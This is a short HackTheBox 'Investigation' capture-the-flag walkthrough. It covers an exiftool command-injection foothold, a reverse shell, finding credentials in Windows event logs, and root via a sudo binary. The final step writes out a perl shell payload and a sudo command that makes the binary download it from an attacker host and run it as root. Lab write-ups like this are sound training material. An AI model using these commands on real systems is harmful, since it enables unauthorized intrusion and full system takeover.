Today We Are Going To Play With HackTheBox Investigation

Nmap scan

Port 22,80 are open.

Homepage

It's a simple webpage .

/service.html

Can upload img files .

Exiftool output

It's using exiftool version 12.37 .

Exiftool command injection

Google search come up with an exploit .

Creating payload

Poc from This page .

Reverseshell

Ippsec's 9001 worked again got a shell as www-data .

Crontab

It's playing with /usr/local/investigation/ directory every 5 minutes .

Looking at /usr/local/investigation/ dir

Microsoft outlook export file lives here .

msgconvert

Converting .msg file to .eml .

Looking at .eml file

Found a base64 encoded blob in Windows Event Logs for Analysis.eml file .

evtx-logs.zip

Discovered that it is an windows event log file after base64 decoding, it requires evtx_dump.py to read it .

Usernames

While grepping for usernames, found a password .

ssh smorton (user)

Smorton user can execute /usr/bin/binary as root without a password .

Who are you /usr/bin/binary? (Ghidra)

It requires lDnxUysaQn string as arg 2 .

RE (Ghidra)

If arg 2 equal to lDnxUysaQn it will curl arg 1 as url and write output to lDnxUysaQn, then execute lDnxUysaQn file with perl .

sudo (root)


		
echo 'system "/bin/bash";' > shell.pl

sudo /usr/bin/binary http://10.10.14./shell.pl lDnxUysaQn

Bingo rooted .
